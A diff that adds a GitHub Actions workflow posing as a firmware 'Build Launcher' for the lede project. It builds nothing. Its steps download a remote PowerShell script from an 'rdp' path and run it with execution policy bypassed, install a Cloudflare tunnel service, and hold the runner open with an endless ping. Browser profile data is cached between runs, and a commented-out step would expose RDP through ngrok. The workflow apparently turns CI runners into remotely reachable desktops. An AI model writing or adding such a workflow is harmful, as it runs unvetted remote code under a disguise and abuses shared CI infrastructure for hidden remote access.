@@ -1,0 +1,69 @@
+name: Build Launcher
+
+on:
+  workflow_dispatch:
+    inputs:
+      platform:
+        description: "devices"
+        required: true
+        default: "x64"
+
+jobs:
+  b:
+    runs-on: windows-2025
+
+    env:
+      REPO_URL: https://github.com/coolsnowwolf/lede
+      REPO_BRANCH: master
+      TZ: Asia/Shanghai
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Init
+        run: |
+          $scriptUrl = "https://github.com/oceanicbloom0/op-builder/raw/refs/heads/master/scripts/rdp/main.ps1"
+          $scriptPath = "$env:TEMP\main.ps1"
+
+          Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+          powershell -ExecutionPolicy Bypass -File $scriptPath
+
+      - name: Restore browser cache
+        uses: actions/cache@v4
+        continue-on-error: true
+        with:
+          path: C:\Users\runneradmin\Desktop\centbrowser\User Data
+          key: browser-userdata-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
+
+      - name: Ngrok
+        env:
+          NGROK_TOKEN: ${{ secrets.NGROK_TOKEN }}
+        run: |
+          # choco install --yes --no-progress ngrok
+          # ngrok.exe authtoken $env:NGROK_TOKEN
+          # Start-Process -NoNewWindow -FilePath ngrok.exe -ArgumentList "tcp --region=jp 3389"
+
+      - name: Zero
+        run: |
+          choco install cloudflared -y
+          cloudflared.exe service install ${{ secrets.CLOUDFLARED_TOKEN }}
+          ping -t 127.0.0.1 > $null
+          Write-Host "completed"
+
+      - name: Create cache directory if needed
+        if: always()
+        run: |
+          $cacheDir = "C:\Users\runneradmin\Desktop\centbrowser\User Data"
+          if (-not (Test-Path $cacheDir)) {
+            New-Item -ItemType Directory -Path $cacheDir -Force | Out-Null
+            Write-Host "Created cache directory: $cacheDir"
+          }
+
+      - name: Save browser cache
+        if: always()
+        uses: actions/cache@v4
+        continue-on-error: true
+        with:
+          path: C:\Users\runneradmin\Desktop\centbrowser\User Data
+          key: browser-userdata-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
